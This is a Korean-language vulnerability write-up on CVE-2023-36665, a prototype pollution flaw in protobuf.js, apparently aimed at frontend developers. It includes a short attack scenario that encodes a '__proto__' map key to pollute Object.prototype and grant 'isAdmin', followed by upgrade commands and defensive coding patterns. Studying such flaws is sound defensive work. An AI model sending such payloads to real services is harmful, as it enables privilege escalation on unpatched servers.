# CVE-2023-36665 - Protobuf.js Prototype Pollution

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2023-36665 |
| CVSS | 9.8 (Critical) |
| 영향 패키지 | protobufjs |
| 영향 버전 | 6.10.0 ~ 6.11.3, 7.0.0 ~ 7.2.4 |
| 수정 버전 | 6.11.4, 7.2.5 |
| 공격 유형 | Prototype Pollution → RCE |
| 발견일 | 2023-07-06 |

## 왜 프론트엔드 개발자가 알아야 하는가

protobuf.js는 Protocol Buffers의 JavaScript 구현체로, 다음 환경에서 사용된다:

- **gRPC-web**: 프론트엔드에서 gRPC 서비스와 통신할 때 메시지 직렬화/역직렬화
- **Firebase**: 내부적으로 protobuf.js를 사용
- **Google Cloud 클라이언트 라이브러리**: 간접 의존성으로 포함
- **실시간 통신**: WebSocket으로 바이너리 프로토콜 사용 시

사용자가 전송한 protobuf 메시지를 디코딩하는 과정에서 프로토타입 오염이 발생하면, 서버 프로세스의 모든 객체가 영향을 받는다.

## 취약점 기술 분석

protobuf.js는 `.proto` 파일에 정의된 스키마에 따라 바이너리 데이터를 JavaScript 객체로 디코딩한다. 이 과정에서 필드명에 대한 검증이 불충분하여 `__proto__`, `constructor.prototype` 등의 키를 통해 프로토타입 체인을 오염시킬 수 있다.

```javascript
// protobuf 메시지 디코딩 시
// 필드명이 '__proto__'인 경우 Object.prototype이 오염됨

// proto 정의
// message Malicious {
//   map<string, string> data = 1;
// }

// 공격자가 조작한 메시지의 map에
// key: "__proto__", value: { "polluted": "true" } 삽입
```

CVE-2022-25878과는 다른 경로로 발생하는 별개의 취약점이며, map 필드 처리 로직의 결함이다.

## 공격 시나리오

```javascript
const protobuf = require('protobufjs');

// gRPC-web 서비스에서 클라이언트 메시지를 디코딩하는 핸들러
async function handleMessage(binaryData) {
  const root = await protobuf.load('service.proto');
  const MessageType = root.lookupType('UserRequest');
  
  // 공격자가 조작한 바이너리 데이터 디코딩
  const decoded = MessageType.decode(binaryData);
  // → Object.prototype이 오염됨!
  
  const config = {};
  // 이제 모든 객체에 공격자가 삽입한 속성이 존재
  console.log(config.isAdmin); // "true" — 프로토타입에서 상속됨!
}

// 실제 공격: 조작된 protobuf 바이너리 생성
const root = await protobuf.load('service.proto');
const MaliciousType = root.lookupType('UserRequest');

// __proto__ 필드를 포함하는 메시지 인코딩
const payload = MaliciousType.encode({
  data: { '__proto__': JSON.stringify({ isAdmin: true }) }
}).finish();

// 이 payload를 gRPC-web 요청으로 전송
```

## 방어 방법

### 즉시 조치
```bash
npm install protobufjs@7.2.5
# 또는 6.x 사용 시
npm install protobufjs@6.11.4
```

### 코드 레벨 방어
```javascript
// ✅ 디코딩 결과를 안전하게 처리
function safeFromProtobuf(decoded) {
  // JSON으로 직렬화 후 재파싱하여 프로토타입 오염 방지
  return JSON.parse(JSON.stringify(decoded));
}

// ✅ Object.create(null)로 안전한 객체 사용
function processMessage(decoded) {
  const safeObj = Object.create(null);
  // 허용된 필드만 명시적으로 복사
  safeObj.name = decoded.name;
  safeObj.email = decoded.email;
  return safeObj;
}

// ✅ 빌드 타임에 정적 코드 생성 사용
// pbjs --target static-module service.proto
// → 런타임 디코딩 대신 타입-안전한 정적 코드 사용
```

### 장기 전략
- protobuf 메시지의 필드명 화이트리스트 검증
- `Object.freeze(Object.prototype)` 적용 검토
- gRPC-web 사용 시 서버 측 입력 검증 강화
- 정적 코드 생성(static codegen)을 기본으로 사용

## 교훈 & 프론트엔드 적용 포인트

1. **바이너리 프로토콜도 안전하지 않다**: "바이너리라서 안전하다"는 착각이다. 디코딩 과정에서 객체를 생성하면 동일한 위험이 존재한다.
2. **프로토타입 오염은 어디서든 발생한다**: JSON 파싱, URL 파싱, protobuf 디코딩 등 객체를 생성하는 모든 곳이 잠재적 벡터다.
3. **입력 검증은 프로토콜에 무관하게 필요하다**: REST, GraphQL, gRPC 모두 동일한 원칙이 적용된다.
4. **정적 코드 생성을 선호하라**: 런타임 동적 처리보다 빌드 타임 정적 생성이 더 안전하다.

## 참고 자료

- [NVD - CVE-2023-36665](https://nvd.nist.gov/vuln/detail/CVE-2023-36665)
- [GitHub Advisory - GHSA-h755-8qp9-cq85](https://github.com/advisories/GHSA-h755-8qp9-cq85)
- [protobufjs GitHub](https://github.com/protobufjs/protobuf.js)
- [gRPC-web 보안 고려사항](https://grpc.io/docs/platforms/web/)
